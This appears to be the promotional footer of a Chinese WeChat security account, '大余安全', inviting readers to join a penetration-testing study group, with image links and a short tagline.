![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)